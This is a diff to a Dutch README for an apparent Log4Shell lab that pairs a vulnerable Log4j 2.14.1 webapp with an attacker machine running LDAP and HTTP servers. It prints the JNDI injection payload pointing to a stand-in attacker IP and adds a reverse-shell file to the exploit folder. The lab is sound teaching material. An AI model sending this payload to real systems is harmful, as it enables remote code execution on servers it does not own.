@@ -16,6 +16,7 @@ Bevat de kwetsbare Java-webapp met Log4j 2.14.1.
 sudo apt update && sudo apt install -y default-jdk wget
 git clone https://github.com/SanderSchepers1993/CyberSec25.git
 cd CyberSec25/scripts
+chmod +x setup_target.sh
 ./setup_target.sh
 ```
 
@@ -36,6 +37,7 @@ Start een LDAP- en HTTP-server om een exploit via JNDI te leveren.
 sudo apt update && sudo apt install -y default-jdk python3 wget
 git clone https://github.com/SanderSchepers1993/CyberSec25.git
 cd CyberSec25/scripts
+chmod +x setup_attacker.sh
 ./setup_attacker.sh
 ```
 
@@ -44,21 +46,21 @@ Gebruik de volgende payload in het formulier op de target:
 ${jndi:ldap://<attacker-ip>:1389/a}
 ```
 
-De calculator op de attacker wordt geopend indien de aanval slaagt.
+De exploit zal nu uitgevoerd zijn.
+Exploit = touch /tmp/HACKED.txt
 
 ---
 
 ## 📁 Structuur
 ```
 CyberSec25/
-├── exploit/         # Exploit.java
+├── exploit/         # Exploit.java + reverse-shell.txt
 ├── ldap/            # LDAPServer.java (UnboundID)
 ├── webapp/          # Jetty + Log4j kwetsbare app
 ├── scripts/
 │   ├── setup_target.sh
 │   └── setup_attacker.sh
-├── log4j2.xml
-└── test_payload.txt
+└── log4j2.xml
 ```
 
 ## ⚠️ Disclaimer
